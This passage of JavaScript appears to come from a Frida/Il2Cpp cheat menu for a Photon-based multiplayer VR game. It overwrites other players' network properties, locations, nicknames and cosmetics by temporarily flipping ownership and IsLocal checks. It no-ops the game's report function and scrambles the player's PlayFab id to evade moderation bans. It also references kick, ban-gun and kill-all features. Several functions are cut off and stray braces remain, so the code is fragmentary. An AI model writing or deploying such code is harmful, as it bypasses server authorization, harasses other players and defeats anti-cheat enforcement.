    // RoomReference/IsLocal branch entirely. Preferred serverside write path.
    // If the client exposes CurrentRoom's protected peer we can also fall back
    // to LoadBalancingPeer.OpSetCustomPropertiesOfActor (2-arg public). We keep
    // a tiny debug counter so you can see hits in logs.
    let _opSetDebug = { ok: 0, fail: 0, lastErr: null, lastCls: null };
    function _opSetCustomPropertiesOfActor(actorNr, ht) {
        const pun = PUN();
        let client = null;
        try { client = pun.field("NetworkingClient").value; } catch (e) { _opSetDebug.lastErr = "NetworkingClient: " + e; }
        if (!client || client.isNull?.()) { _opSetDebug.fail++; return false; }
        _opSetDebug.lastCls = String(client.class?.type?.name || client.class?.name || "<?>");
        // LoadBalancingClient.OpSetCustomPropertiesOfActor(int, Hashtable, Hashtable, WebFlags)
        try {
            const r = client.method("OpSetCustomPropertiesOfActor", 4).invoke(actorNr, ht, NULL, NULL);
            if (r !== false) { _opSetDebug.ok++; return true; }
            _opSetDebug.lastErr = "4-arg returned false";
        } catch (e) { _opSetDebug.lastErr = "4-arg: " + e; }
        // Fallback: 2-arg on LoadBalancingPeer (reach via loadBalancingPeer field)
        try {
            let peer = null;
            try { peer = client.field("loadBalancingPeer").value; } catch (_) { }
            if (!peer || peer.isNull?.()) { try { peer = client.method("get_LoadBalancingPeer").invoke(); } catch (_) { } }
            if (peer && !peer.isNull?.()) {
                try {
                    const r = peer.method("OpSetCustomPropertiesOfActor", 2).invoke(actorNr, ht);
                    if (r !== false) { _opSetDebug.ok++; return true; }
                    _opSetDebug.lastErr = "peer 2-arg returned false";
                } catch (e) { _opSetDebug.lastErr = "peer 2-arg: " + e; }
            }
        } catch (e) { _opSetDebug.lastErr = "peer path: " + e; }
        // Last fallback: 2-arg directly on client (older PUN)
        try {
            const r = client.method("OpSetCustomPropertiesOfActor", 2).invoke(actorNr, ht);
            if (r !== false) { _opSetDebug.ok++; return true; }
            _opSetDebug.lastErr = "2-arg returned false";
        } catch (e) { _opSetDebug.lastErr = "2-arg: " + e; }
        _opSetDebug.fail++;
        return false;
    }
    // Set a single Photon custom property on every player in the room via the
    // low-level actor-targeted op, so other players' props actually update.
    function _setPropOnAllPlayers(key, value) {
        let n = 0;
        try {
            for (const p of allPlayers()) {
                if (!p || p.isNull?.()) continue;
                const ht = _newPhotonHashtable(key, value);
                if (!ht) continue;
                let actorNr = 0;
                try { actorNr = p.method("get_ActorNumber").invoke(); } catch (_) { continue; }
                if (!actorNr) continue;
                if (_opSetCustomPropertiesOfActor(actorNr, ht)) { n++; continue; }
                // Fallback: Player.SetCustomProperties on that actor. The online
                // branch has no ownership guard (it targets the player's OWN
                // actorNumber), but a remote Player whose RoomReference is null
                // hits the IsLocal check and returns false — boolean respected.
                if (_setPlayerCustomProperties(p, ht)) n++;
            }
            sendAllOutgoing();
        } catch (e) { ARC.warnOnce("setpropall", "set-all " + key + ": " + e); }
        return n;
    }
    // Read one custom property back off a Player's client-side cache. Photon
    // broadcasts accepted actor-property changes back to every client, so a
    // match with the tagged string is proof the SERVER accepted our write.
    function _getPlayerProp(player, key) {
        try {
            if (!player || player.isNull?.()) return null;
            const cp = player.method("get_CustomProperties").invoke();
            if (!cp || cp.isNull?.()) return null;
            let count = null;
            try { count = cp.field("count").value; } catch (_) { }
            if (count === null) { try { count = cp.field("_count").value; } catch (_) { } }
            let entries = null;
            try { entries = cp.field("entries").value; } catch (_) { try { entries = cp.field("_entries").value; } catch (_) { } }
            const cn = count?.valueOf ? count.valueOf() : count;
            if (!entries || entries.isNull?.() || !cn) return null;
            for (let i = 0; i < cn && i < 64; i++) {
                let e = null;
                try { e = entries.get(i); } catch (_) { continue; }
                if (!e) continue;
                let kk = null, vv = null;
                try { kk = e.field("key").value; } catch (_) { }
                try { vv = e.field("value").value; } catch (_) { }
                let ks = null;
                if (kk && !kk.isNull?.()) {
                    ks = kk.content ?? null;
                    if (typeof ks !== "string") {
                        try {
                            if (kk.class.name === "System.String") ks = new Il2Cpp.String(kk.handle).content;
                            else ks = null;
                        } catch (_) { ks = null; }
                    }
                }
                if (ks !== key) continue;
                if (!vv || vv.isNull?.()) return "";
                let vs = vv.content ?? null;
                if (typeof vs !== "string") {
                    try {
                        const tn = vv.class.name;
                        if (tn === "System.String") vs = new Il2Cpp.String(vv.handle).content;
                        else vs = null;
                    } catch (_) { vs = null; }
                }
                return typeof vs === "string" ? vs : null;
            }
        } catch (_) { }
        return null;
    }
    // PhotonVRPlayer -> PlayerTrackerComponent for any player (local or remote).
    function _trollLocTrackerOf(player) {
        try {
            if (!player || player.isNull?.()) return null;
            const pvrCls = _classQuiet("Photon.VR.Player.PhotonVRPlayer");
            if (!pvrCls) return null;
            const pvr = pvrCls.method("FromPlayer", 1).invoke(player);
            if (!pvr || pvr.isNull?.()) return null;
            const tr = pvr.method("get_PlayerTrackerComponent").invoke();
            return tr && !tr.isNull?.() ? tr : null;
        } catch (_) { return null; }
    }
    // Drive a REMOTE player's own tracker SetLocation through the game's write
    // path. The reactive wrapper gates on its mode field KDFLIMDDOJE
    // (DIMPJOLEKFF: Owner=0/Server=1/Everyone=2): mode 0 requires PhotonView
    // IsMine, mode 1 requires master, mode 2 writes directly to the view owner
    // -> Player.SetCustomProperties -> OpSetPropertiesOfActor(owner.actorNr).
    // Flip it to 2 (Everyone) for the call, restore afterwards. Enum fields
    // read as Il2Cpp.ValueType aliased to the field memory, so value__ is
    // written in place (_enumVal reads the underlying int).
    function _trollLocRemoteViaTracker(p, tagged) {
        try {
            const tracker = _trollLocTrackerOf(p);
            if (!tracker) return false;
            const wrap = tracker.field("DDAGDLIOEAE").value;
            if (!wrap || wrap.isNull?.()) return false;
            let vt = null, prev = -1;
            try {
                vt = wrap.field("DNGAEFEINPL").value;
                prev = _enumVal(vt);
                if (!vt || typeof vt.field !== "function" || prev < 0) return false;
                vt.field("value__").value = 2;
            } catch (_) { return false; }
            try {
                tracker.method("SetLocation", 1).invoke(Il2Cpp.string(tagged));
                return true;
            } finally {
                try { vt.field("value__").value = prev; } catch (_) { }
            }
        } catch (e) { ARC.warnOnce("trollLocRemote", "remote tracker: " + e); return false; }
    }
    // One full serverside push: our own tracker (proven path), every remote
    // tracker via the Everyone-mode flip, then actor-targeted property ops for
    // every player. Called from enableMethod and re-run every ~4s while toggled.
    function _trollLocPush(st) {
        const out = { ownOk: false, remoteN: 0, propN: 0 };
        try {
            const tracker = _trollLocTrackerOf(localPlayer());
            if (tracker) { tracker.method("SetLocation", 1).invoke(Il2Cpp.string(st.tagged)); out.ownOk = true; }
        } catch (e) { ARC.warnOnce("trollLocOwn", "own SetLocation: " + e); }
        try {
            for (const p of otherPlayers()) {
                if (_trollLocRemoteViaTracker(p, st.tagged)) out.remoteN++;
            }
        } catch (e) { ARC.warnOnce("trollLocRemote", "remote loop: " + e); }
        out.propN = _setPropOnAllPlayers(st.key, st.tagged);
        sendAllOutgoing();
        st.pushes = (st.pushes || 0) + 1;
        return out;
    }

    }

    // "anti shit": in-lobby PlayFab id scrambler. Writes a bullshit playfab_id
    // to our Photon custom-props so the mod ban menu reports a fake id. Only

    let _antiShitReport3Addr = null;

    function _antiShitInstallReportHooks() {
        if (_antiShitReportInstalled) return 0;
        try {
            const by = _classQuiet("bybyeee") || _classOrNull("bybyeee");
            if (!by) { console.warn("[antiban] bybyeee class not found"); return 0; }
            const r3 = by.method("report3", 2);
            if (!r3) { console.warn("[antiban] report3 method not found"); return 0; }
            _antiShitReport3Addr = r3.virtualAddress;
            _antiShitReport3Stub = new NativeCallback(function () { }, "void", ["pointer", "pointer", "pointer"]);
            Interceptor.replace(_antiShitReport3Addr, _antiShitReport3Stub);
            _antiShitReportInstalled = true;
            console.log("[antiban] report3 no-op installed @ " + _antiShitReport3Addr);
            return 1;
        } catch (e) { console.warn("[antiban] install failed: " + e); return 0; }
    }
    function _antiShitRemoveReportHooks() {

            try { Interceptor.revert(_antiShitReport3Addr); } catch (_) { }
            _antiShitReport3Addr = null;
            _antiShitReport3Stub = null;
        }
        _antiShitReportInstalled = false;
    }
    // Read a player's "Cosmetics" prop as parsed JSON (empty object if missing).
    function _playerCosmeticsJson(player) {
        try {
            if (!player || player.isNull?.()) return {};
            const props = player.method("get_CustomProperties").invoke();
            if (!props || props.isNull?.()) return {};
            const v = props.method("get_Item", 1).overload("System.Object").invoke(Il2Cpp.string("Cosmetics"));
            const s = _il2cppStr(v);
            return s ? JSON.parse(s) : {};
        } catch (_) { return {}; }
    }
    // Return true if targetCosJson already includes every key:val from our cache
    // (prevents a feedback loop: our push triggers an OnPlayerPropertiesUpdate,
    // which the toggle sees as a cosmetic change, which would re-push forever).
    function _giveAllCosContainsOurs(targetCosRaw) {
        if (!_giveAllCosmeticsCache) return true;
        let target = null;
        try { target = targetCosRaw ? JSON.parse(targetCosRaw) : {}; } catch (_) { return false; }
        for (const k in _giveAllCosmeticsCache) {
            if (!_giveAllCosmeticsCache[k]) continue;
            if (target[k] !== _giveAllCosmeticsCache[k]) return false;
        }
        return true;
    }
    // Push to ONE actor by actorNr: MERGE our cache into their existing
    // Cosmetics prop (we win on conflicting keys, their other slots untouched).
    function _giveAllPushToActor(actorNr) {
        if (!_giveAllCosmeticsCache || !actorNr) return false;
        // Find the Player object matching this actor number so we can read
        // their current Cosmetics prop for the merge base.
        let target = null;
        try {
            for (const p of allPlayers()) {
                let nr = 0;
                try { nr = p.method("get_ActorNumber").invoke(); } catch (_) { continue; }
                if (nr === actorNr) { target = p; break; }
            }
        } catch (_) { }
        const existing = _playerCosmeticsJson(target);
        const merged = {};
        for (const k in existing) merged[k] = existing[k];
        for (const k in _giveAllCosmeticsCache) {
            if (_giveAllCosmeticsCache[k]) merged[k] = _giveAllCosmeticsCache[k];
        }
        const json = JSON.stringify(merged);
        const ht = _newPhotonHashtable("Cosmetics", json);
        if (!ht) return false;
        const ok = _opSetCustomPropertiesOfActor(actorNr, ht);
        try { sendAllOutgoing(); } catch (_) { }
        // Instant local-view: force-equip on that specific actor's rig.
        _giveAllLocalEquipOnActor(actorNr, merged);
        return ok;
    }
    // Push to EVERY actor in room (used on toggle enable).
    function _giveAllPushToAll() {
        if (!_giveAllCosmeticsCache) return 0;
        let n = 0;
        try {
            for (const p of allPlayers()) {
                if (!p || p.isNull?.()) continue;
                let nr = 0; try { nr = p.method("get_ActorNumber").invoke(); } catch (_) { continue; }
                if (!nr) continue;
                if (_giveAllPushToActor(nr)) n++;
            }
            if (!_giveAllServerLogged || time - _giveAllServerLogged > 5) {
                _giveAllServerLogged = time;
                console.log("[giveAll] pushed merged Cosmetics to " + n + " actors");
            }
        } catch (e) { ARC.warnOnce("giveAll-all", "push all: " + e); }
        return n;
    }
    // Local-view equip helper: find the matching rig for actorNr and force
    // CosmeticEquiperComponent.Equip for each slot in the merged map so we see
    // the change instantly without waiting for the OnPlayerPropertiesUpdate hop.
    function _giveAllLocalEquipOnActor(actorNr, cosMap) {
        try {
            const updCls = _classOrNull("PhotonCosmeticUpdaterComponent");
            if (!updCls) return 0;
            const list = _findAllOfType(updCls, "PhotonCosmeticUpdaterComponent");
            if (!list || list.isNull?.()) return 0;
            let pv = null;
            for (const asm of ["PhotonUnityNetworking", "Assembly-CSharp"]) {
                try { pv = Il2Cpp.domain.assembly(asm).image.class("Photon.Pun.PhotonView"); if (pv) break; } catch (_) { }
            }
            let ctZero = null;
            try {
                const ctCls = Il2Cpp.corlib.class("System.Threading.CancellationToken");
                const boxed = ctCls.alloc();
                try { boxed.method(".ctor", 0).invoke(); } catch (_) { }
                try { ctZero = boxed.unbox(); } catch (_) { ctZero = boxed; }
            } catch (_) { }
            let hit = 0;
            for (let i = 0; i < list.length; i++) {
                const u = arrObj(list, i);
                if (!u || u.isNull?.()) continue;
                // Match this updater to the target actorNr via PhotonView.Owner.ActorNumber.
                if (pv) {
                    try {
                        const go = u.method("get_gameObject").invoke();
                        let view = null;
                        try { view = getComponent(go, pv); } catch (_) { }
                        if (!unityAlive(view)) { try { view = go.method("GetComponentInParent", 1).inflate(pv).invoke(); } catch (_) { } }
                        if (!unityAlive(view)) continue;
                        const owner = view.method("get_Owner").invoke();
                        if (!owner || owner.isNull?.()) continue;
                        const nr = owner.method("get_ActorNumber").invoke();
                        if (nr !== actorNr) continue;
                    } catch (_) { continue; }
                }
                // Dict: write slot->id so the game's publisher keeps our values.
                try {
                    const dict = u.field("PMGHNECMCOA").value;
                    if (dict && !dict.isNull?.()) {
                        for (const k in cosMap) {
                            if (BIDBHMCCOCH_SLOTS[k] === undefined || !cosMap[k]) continue;
                            try { dict.method("set_Item", 2).invoke(BIDBHMCCOCH_SLOTS[k], Il2Cpp.string(cosMap[k])); } catch (_) { }
                        }
                    }
                } catch (_) { }
                // Equipper: visible change this frame.
                try {
                    const eq = u.field("DOHDLNHEAFI").value;
                    if (unityAlive(eq)) {
                        for (const k in cosMap) {
                            if (!cosMap[k]) continue;
                            try { eq.method("Equip", 2).overload("System.String", "System.Threading.CancellationToken").invoke(Il2Cpp.string(cosMap[k]), ctZero); hit++; }
                            catch (_) {
                                try { eq.method("Equip", 2).invoke(Il2Cpp.string(cosMap[k]), ctZero); hit++; } catch (_) { }
                            }
                        }
                    }
                } catch (_) { }
            }
            return hit;
        } catch (_) { return 0; }
    }
    // ---------- Shared player-change event bus ----------
    // Toggle methods subscribe to onPlayerJoined / onPlayerCosmeticsChanged and
    // only run on those events instead of every frame. Polls once per second,
    // compares against last snapshot, fires subscribers for diffs.
    const _playerSnapshot = { ids: null, cos: {} }; // actorNr -> Cosmetics-prop raw string
    const _onPlayerJoinedCallbacks = [];              // (actorNr) => void
    const _onPlayerCosmeticsChangedCallbacks = [];    // (actorNr, cosJson) => void
    let _playerPollNext = 0;
    function _pollPlayerChanges() {
        if (time < _playerPollNext) return;
        _playerPollNext = time + 1.0;
        try {
            const curIds = {};         // use plain object as a set
            const curCos = {};
            for (const p of allPlayers()) {
                if (!p || p.isNull?.()) continue;
                let actorNr = 0;
                try { actorNr = p.method("get_ActorNumber").invoke(); } catch (_) { continue; }
                if (!actorNr) continue;
                curIds[actorNr] = true;
                try {
                    const props = p.method("get_CustomProperties").invoke();
                    if (props && !props.isNull?.()) {
                        const v = props.method("get_Item", 1).invoke(Il2Cpp.string("Cosmetics"));
                        curCos[actorNr] = _il2cppStr(v) || "";
                    } else curCos[actorNr] = "";
                } catch (_) { curCos[actorNr] = ""; }
            }
            const first = _playerSnapshot.ids === null;
            if (!first) {
                for (const id in curIds) {
                    if (!_playerSnapshot.ids[id]) {
                        for (const cb of _onPlayerJoinedCallbacks) {
                            try { cb(parseInt(id, 10)); } catch (e) { ARC.warnOnce("joined-cb", "joined cb: " + e); }
                        }
                    }
                }
                for (const id in curCos) {
                    if (_playerSnapshot.cos[id] !== curCos[id]) {
                        for (const cb of _onPlayerCosmeticsChangedCallbacks) {
                            try { cb(parseInt(id, 10), curCos[id]); } catch (e) { ARC.warnOnce("cos-cb", "cos cb: " + e); }
                        }
                    }
                }
            }
            _playerSnapshot.ids = curIds;
            _playerSnapshot.cos = curCos;
        } catch (e) { ARC.warnOnce("playerPoll", "player poll: " + e); }
    }
    function _addJoinedCallback(cb) {
        _onPlayerJoinedCallbacks.push(cb);
        return () => { const i = _onPlayerJoinedCallbacks.indexOf(cb); if (i >= 0) _onPlayerJoinedCallbacks.splice(i, 1); };
    }
    function _addCosmeticsCallback(cb) {
        _onPlayerCosmeticsChangedCallbacks.push(cb);
        return () => { const i = _onPlayerCosmeticsChangedCallbacks.indexOf(cb); if (i >= 0) _onPlayerCosmeticsChangedCallbacks.splice(i, 1); };
    }
    // Server-side NickName sync for OTHER players. Photon's Player.set_NickName
    // guards on `IsLocal` and only ships OpSetPropertiesOfActor for the local
    // actor. We flip IsLocal to true for a single frame around the call so the
    // SDK ships the op targeting the OTHER actor's number, then restore it.
    // Any master-client requirement is still enforced by Photon's server config.
    function _forcePlayerNickName(player, name) {
        if (!player || player.isNull?.()) return false;
        let prev = false;
        let flipped = false;
        try {
            try { prev = !!player.field("IsLocal").value; } catch (_) { }
            try { player.field("IsLocal").value = true; flipped = true; } catch (_) { }
            try { player.method("set_NickName").invoke(Il2Cpp.string(String(name))); }
            catch (e) { ARC.warnOnce("forceNick", "set_NickName other: " + e); }
        } finally {
            if (flipped) {
                try { player.field("IsLocal").value = prev; } catch (_) { }
            }
        }
        return true;
    }
    function _setNickNameOnAllOthers(name) {

                if (_forcePlayerNickName(p, name)) n++;
            }
            sendAllOutgoing();
        } catch (e) { ARC.warnOnce("nickall", "nick all: " + e); }
        return n;
    }

    function _kickPlayer(player) {

    // Resource paths can change with the active scene (the Backrooms rig is
    // different from the level1 rig). Prefer a cached success, but if it stops
    // working retry every candidate instead of remaining stuck on stale state.
    const _spawnPathCache = new Map();
    // An Il2CppExceptionWrapper from PhotonNetwork.Instantiate can be caught by
    // JavaScript once yet still abort UnityMain after repeated bridge calls.
    // Quarantine only the rejected spawn kind for the current room; successful
    // spawning remains unlimited and a room transition clears the quarantine.
    const _spawnFailureQuarantine = new Set();
    function netSpawn(candidates, pos) {
        if (!_syncArcaneRoomState(true)) {
            ARC.warnOnce("spawn-outside-room", "network spawn ignored because Photon is not in a room");
            return null;
        }
        const key = candidates.join("|");
        const roomKey = String(_arcaneRoomToken || "room") + "|" + key;
        if (_spawnFailureQuarantine.has(roomKey)) return null;
        const known = _spawnPathCache.get(key);
        const path = known || candidates.find(candidate => !!candidate);
        if (!path) return null;
        try {
            // Exactly one managed Instantiate call per activation. Continuing
            // through fallback paths after `abort was called` caused the fatal
            // uncaught Il2CppExceptionWrapper seen in the tombstone.
            const o = PUN().method("Instantiate", 5).invoke(
                Il2Cpp.string(path), pos, identityQuaternion, 0, NULL);
            if (o && !o.isNull?.()) {
                if (known !== path) {
                    _spawnPathCache.set(key, path);
                    console.log("[mods] spawn path OK: " + path);
                }
                return o;
            }
            _spawnPathCache.delete(key);
            _spawnFailureQuarantine.add(roomKey);
            ARC.warnOnce("spawn-null:" + roomKey,
                "Photon returned null for " + path + "; this spawn is paused until the room changes");
        } catch (e) {
            _spawnPathCache.delete(key);
            _spawnFailureQuarantine.add(roomKey);
            ARC.warnOnce("spawn-abort:" + roomKey,
                "Photon rejected " + path + "; this spawn is paused until the room changes: " + e);
        }
        return null;
    }

    }

    // Resolve only the network player whose hierarchy owns the collider the
    // gun actually hit. There is deliberately no nearest-player fallback.
    let _pvrPlayerClass = null, _photonViewClass = null;
    function _samePhotonPlayer(a, b) {
        if (!a || !b || a.isNull?.() || b.isNull?.()) return false;
        const ah = normalizeSceneObjectHandle(a), bh = normalizeSceneObjectHandle(b);
        if (ah && bh && ah === bh) return true;
        try {
            return a.method("get_ActorNumber").invoke() === b.method("get_ActorNumber").invoke();
        } catch (_) { return false; }
    }
    function photonOwnerFromHitCollider(hitCollider) {
        if (!unityAlive(hitCollider)) return null;
        try {
            if (!_pvrPlayerClass) _pvrPlayerClass = AssemblyCSharp.class("Photon.VR.Player.PhotonVRPlayer");
            if (!_photonViewClass) {
                _photonViewClass = Il2Cpp.domain.assembly("PhotonUnityNetworking")
                    .image.class("Photon.Pun.PhotonView");
            }
            let go = hitCollider.method("get_gameObject").invoke();
            for (let depth = 0; depth < 24 && unityAlive(go); depth++) {
                const playerComponent = getComponent(go, _pvrPlayerClass);
                if (unityAlive(playerComponent)) {
                    let view = null;
                    try { view = playerComponent.method("get_photonView").invoke(); } catch (_) { }
                    if (!unityAlive(view)) view = getComponent(go, _photonViewClass);
                    if (!unityAlive(view)) return null;
                    const owner = view.method("get_Owner").invoke();
                    const local = localPlayer();
                    if (!owner || owner.isNull?.() || !local || local.isNull?.()) return null;
                    return _samePhotonPlayer(owner, local) ? null : owner;
                }
                const transform = getTransform(go);
                if (!unityAlive(transform)) break;
                const parent = transform.method("get_parent").invoke();
                if (!unityAlive(parent)) break;
                go = parent.method("get_gameObject").invoke();
            }
        } catch (e) { ARC.err("photonOwnerFromHitCollider", e); }
        return null;
    }

    function _currentArcaneRoomToken() {
        // Tri-state: null means the bridge query was inconclusive, "" means a
        // confirmed lobby/not-in-room state, and a handle is a real room.
        // Never turn a transient IL2CPP exception into a fake room change.
        const pun = PUN();
        if (!pun) return null;
        let inRoom;
        try { inRoom = !!pun.method("get_InRoom").invoke(); }
        catch (_) { return null; }
        if (!inRoom) return "";
        let room;
        try { room = pun.method("get_CurrentRoom").invoke(); }
        catch (_) { return null; }
        if (!room || room.isNull?.()) return null;
        return normalizeSceneObjectHandle(room) || null;
    }
    function _syncArcaneRoomState(force = false) {
        const frame = _arcaneUnityFrame();
        if (!force && frame === _arcaneRoomCheckedFrame) return _arcaneRoomActive;
        _arcaneRoomCheckedFrame = frame;
        const token = _currentArcaneRoomToken();
        if (token === null) return _arcaneRoomActive;
        _arcaneRoomActive = !!token;
        if (_arcaneRoomToken === null) {
            _arcaneRoomToken = token;
            return _arcaneRoomActive;
        }
        if (token !== _arcaneRoomToken) {
            const oldToken = _arcaneRoomToken;
            _arcaneRoomToken = token;
            _spawnPathCache.clear();
            _spawnFailureQuarantine.clear();
            _zombieSpawnPathsCache = null;
            _rigSpamNext = _rigGunNext = _zombieGunNext = _destroyGunNext = _spawnAllMonstersNext = _banGunNext = 0;
        _fullAutoNext = _maxFireNext = _killAllNext = _destroyAllNext = 0;
            _masterNoticeNext = 0;
            console.log("[mods] Photon room state changed; spawn caches reset (" +
                (oldToken ? "room" : "lobby") + " -> " + (token ? "room" : "lobby") + ")");
        }
        return _arcaneRoomActive;
    }
